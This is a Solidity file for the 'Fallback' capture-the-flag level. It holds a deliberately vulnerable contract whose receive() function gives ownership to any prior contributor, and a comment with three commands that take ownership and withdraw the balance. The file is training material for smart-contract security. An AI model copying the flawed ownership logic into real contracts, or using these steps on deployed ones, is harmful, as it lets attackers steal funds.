// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * @title 1. FALLBACK
 * @dev Claim the ownership of the contract and reduce its balance to 0.
 */

/*
1. Start by contributing to fullfill the require statement in the receive() function
await contract.contribute({ value: toWei("0.00001") });

2. Send eth to the contract directly to trigger the receive() function
await contract.sendTransaction({ value: toWei("0.00001") });

3. Withdraw the funds
await contract.withdraw();


🎉 Level completed! 🎉
*/

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract Fallback {
    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
